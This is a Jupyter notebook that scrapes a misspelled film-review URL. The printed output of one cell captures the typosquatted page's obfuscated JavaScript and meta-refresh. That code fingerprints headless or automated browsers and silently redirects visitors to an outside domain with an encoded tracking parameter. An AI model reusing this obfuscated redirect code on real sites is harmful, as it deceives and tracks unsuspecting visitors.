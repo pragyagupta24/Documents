{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "from dputils.scrape import Scraper, Tag"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "sc = Scraper(\"http://www.rottentomatotes.com/m/avengers_endgame\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "<html><head><link href=\"data:image/x-icon;base64,\" rel=\"icon\" type=\"image/x-icon\"/><script type=\"text/javascript\">document.write(\"<scr\"+\"ipt>var _0x18d0f5=_0x2dd9;function _0x49f3(){var _0x541f0f=['285565wHtOKp','&_ns=0','location','aGVhZGxlc3M=','_nn','_wd','_cd','all','includes','cookieEnabled','1671356hFBaGB','_if','undefined','innerWidth','402CKZher','1175112uIUDjk','Y3Q9','32hiDpPP','9XeGORq','_hl','470wyEdPc','indexOf','1838448BsjfOF','5154110neBzae','cookie','','2876690pLuXOv','webdriver','test','_iw','aHR0cDovLzgxNDMuaW51c2VtZS5jb20vbWF0Y2gtODE0My83OTg4Ny85ODgxMDcyLzE2ODAwNjM1MDYvbWZfMDUxMDhiNjktMTQwOC00ZjcxLWEyNDctY2NmZDQzODYwMjhmL1lYQnBlREEzTFhKdmRIUmxiblJ2YldGMGIzUmxjeTVqYjIxOE1UWTRNREEyTXpVd05pNHlORFl5TnpBdE9UZzRNVEEzTWkwM09UZzROdz09','Y3Q9MQ=='];_0x49f3=function(){return _0x541f0f;};return _0x49f3();}(function(_0x312b08,_0x36d69e){var _0x113a4c=_0x2dd9,_0x11926d=_0x312b08();while(!![]){try{var _0x2cff74=-parseInt(_0x113a4c(0x137))/0x1*(parseInt(_0x113a4c(0x13d))/0x2)+-parseInt(_0x113a4c(0x138))/0x3+parseInt(_0x113a4c(0x153))/0x4+-parseInt(_0x113a4c(0x143))/0x5+parseInt(_0x113a4c(0x13f))/0x6+-parseInt(_0x113a4c(0x149))/0x7*(-parseInt(_0x113a4c(0x13a))/0x8)+-parseInt(_0x113a4c(0x13b))/0x9*(-parseInt(_0x113a4c(0x140))/0xa);if(_0x2cff74===_0x36d69e)break;else _0x11926d['push'](_0x11926d['shift']());}catch(_0x30aa4f){_0x11926d['push'](_0x11926d['shift']());}}}(_0x49f3,0x5354e));var x=_0x18d0f5(0x147),f='https://bestofbrowsing.com/?_x=aHR0cDovLzgxNDMuaW51c2VtZS5jb20vbWF0Y2gtODE0My83OTg4Ny85ODgxMDcyLzE2ODAwNjM1MDYvbWZfMDUxMDhiNjktMTQwOC00ZjcxLWEyNDctY2NmZDQzODYwMjhmL1lYQnBlREEzTFhKdmRIUmxiblJ2YldGMGIzUmxjeTVqYjIxOE1UWTRNREEyTXpVd05pNHlORFl5TnpBdE9UZzRNVEEzTWkwM09UZzROdz09',b=![],d=_0x18d0f5(0x142);function _0x2dd9(_0x241ccd,_0x112f5a){var _0x49f321=_0x49f3();return _0x2dd9=function(_0x2dd9ff,_0x105812){_0x2dd9ff=_0x2dd9ff-0x135;var _0x420489=_0x49f321[_0x2dd9ff];return _0x420489;},_0x2dd9(_0x241ccd,_0x112f5a);}try{if(!d||d!==_0x18d0f5(0x150)){d=d['split'](',');var t=new Object();!d[_0x18d0f5(0x151)]('nn')&&(t[_0x18d0f5(0x14d)]=typeof navigator===_0x18d0f5(0x135)?0x1:0x0);!d['includes']('hl')&&(t['_hl']=new RegExp(atob(_0x18d0f5(0x14c)),'i')[_0x18d0f5(0x145)](navigator['userAgent'])?0x1:0x0);!d['includes']('wd')&&(t['_wd']=navigator[_0x18d0f5(0x144)]?0x1:0x0);!d[_0x18d0f5(0x151)]('iw')&&(t['_iw']=window[_0x18d0f5(0x136)]===0x0&&window['innerHeight']===0x0?0x1:0x0);!d[_0x18d0f5(0x151)]('if')&&(t['_if']=self!=top?0x1:0x0);if(!d[_0x18d0f5(0x151)]('cd')){if(!navigator[_0x18d0f5(0x152)])try{document[_0x18d0f5(0x141)]=atob(_0x18d0f5(0x148));var c=document[_0x18d0f5(0x141)][_0x18d0f5(0x13e)](atob(_0x18d0f5(0x139)))!==-0x1;if(c)document['cookie']=atob('Y3Q9MTsgZXhwaXJlcz1UaHUsIDAxLUphbi0xOTcwIDAwOjAwOjAxIEdNVA==');}catch(_0x5d12f6){}t[_0x18d0f5(0x14f)]=!navigator[_0x18d0f5(0x152)]&&!c?0x1:0x0;}b=t[_0x18d0f5(0x14d)]||t[_0x18d0f5(0x13c)]||t[_0x18d0f5(0x14e)]||t[_0x18d0f5(0x146)]||t[_0x18d0f5(0x154)]||t[_0x18d0f5(0x14f)];if(b){x=f+_0x18d0f5(0x14a);for(var _t in t){x+='&'+_t+'='+t[_t];}}}}catch(_0x6036f7){}finally{window[_0x18d0f5(0x14b)]=b?x:atob(x);}</sc\"+\"ript>\")</script><noscript><meta content=\"0; url=https://bestofbrowsing.com/?_x=aHR0cDovLzgxNDMuaW51c2VtZS5jb20vbWF0Y2gtODE0My83OTg4Ny85ODgxMDcyLzE2ODAwNjM1MDYvbWZfMDUxMDhiNjktMTQwOC00ZjcxLWEyNDctY2NmZDQzODYwMjhmL1lYQnBlREEzTFhKdmRIUmxiblJ2YldGMGIzUmxjeTVqYjIxOE1UWTRNREEyTXpVd05pNHlORFl5TnpBdE9UZzRNVEEzTWkwM09UZzROdz09&amp;_ns=1\" http-equiv=\"refresh\"/></noscript></head><body></body></html>\n",
      "\n"
     ]
    }
   ],
   "source": [
    "print(sc.soup)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "sc.soup.title"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[]"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sc.soup.find_all('a')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.8"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
